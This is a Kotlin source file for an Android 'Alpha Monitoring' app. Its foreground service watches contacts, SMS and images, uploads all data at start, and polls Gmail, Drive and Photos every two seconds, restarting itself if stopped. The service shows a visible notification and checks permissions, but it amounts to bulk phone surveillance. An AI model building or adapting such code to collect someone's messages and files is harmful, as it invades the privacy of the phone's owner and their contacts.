package com.example.alphamonitoringapp.monitoring.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.widget.Toast
import androidx.annotation.RequiresApi
import com.example.alphamonitoringapp.R
import com.example.alphamonitoringapp.monitoring.DataUploader
import com.example.alphamonitoringapp.monitoring.observer.ContactObserver
import com.example.alphamonitoringapp.monitoring.observer.SMSObserver
import com.example.alphamonitoringapp.monitoring.observer.GmailObserver
import com.example.alphamonitoringapp.monitoring.observer.DriveObserver
import com.example.alphamonitoringapp.monitoring.observer.PhotosObserver
import com.example.alphamonitoringapp.monitoring.observer.GalleryObserver

class ForegroundUploadService : Service() {

    private lateinit var contactObserver: ContactObserver
    private lateinit var smsObserver: SMSObserver
    private lateinit var galleryObserver: GalleryObserver

    private val gmailHandler = Handler(Looper.getMainLooper())
    private val driveHandler = Handler(Looper.getMainLooper())
    private val photosHandler = Handler(Looper.getMainLooper())

    private val gmailRunnable = object : Runnable {
        override fun run() {
            GmailObserver.onTrigger(this@ForegroundUploadService)
            gmailHandler.postDelayed(this, 2 * 1000)
        }
    }

    private val driveRunnable = object : Runnable {
        override fun run() {
            DriveObserver.onTrigger(this@ForegroundUploadService)
            driveHandler.postDelayed(this, 2 * 1000)
        }
    }

    private val photosRunnable = object : Runnable {
        override fun run() {
            PhotosObserver.onTrigger(this@ForegroundUploadService)
            photosHandler.postDelayed(this, 2 * 1000)
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate() {
        super.onCreate()

        // 🔔 Foreground notification setup
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = "alpha_monitoring_channel"
            val channel = NotificationChannel(
                channelId,
                "Monitoring Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)

            val notification: Notification = Notification.Builder(this, channelId)
                .setContentTitle("Alpha Monitoring")
                .setContentText("Monitoring contacts, SMS, Gmail, Drive, Photos")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .build()

            startForeground(1, notification)
        }

        // ✅ Contact observer
        if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
        ) {
            contactObserver = ContactObserver(this)
            contentResolver.registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI,
                true,
                contactObserver
            )
        }

        // ✅ SMS observer
        if (checkSelfPermission(android.Manifest.permission.READ_SMS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
        ) {
            smsObserver = SMSObserver(this, Handler(Looper.getMainLooper()))
            contentResolver.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                smsObserver
            )
        }

        // ✅ Gallery observer
        // ✅ Gallery observer (supports Android 13+ and below)
        if (
            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                    checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED) ||

            (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU &&
                    checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED)
        ) {
            galleryObserver = GalleryObserver(this, Handler(Looper.getMainLooper()))
            contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                galleryObserver
            )
        }



        // ✅ Initial upload
        DataUploader.uploadAllData(this)
        GmailObserver.onTrigger(this)
        DriveObserver.onTrigger(this)
        PhotosObserver.onTrigger(this)

        // ✅ Periodic Gmail, Drive, Photos monitoring
        gmailHandler.post(gmailRunnable)
        driveHandler.post(driveRunnable)
        photosHandler.post(photosRunnable)

        Toast.makeText(this, "Monitoring & Sync started", Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()

        if (::contactObserver.isInitialized) {
            contentResolver.unregisterContentObserver(contactObserver)
        }
        if (::smsObserver.isInitialized) {
            contentResolver.unregisterContentObserver(smsObserver)
        }
        if (::galleryObserver.isInitialized) {
            contentResolver.unregisterContentObserver(galleryObserver)
        }

        gmailHandler.removeCallbacks(gmailRunnable)
        driveHandler.removeCallbacks(driveRunnable)
        photosHandler.removeCallbacks(photosRunnable)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
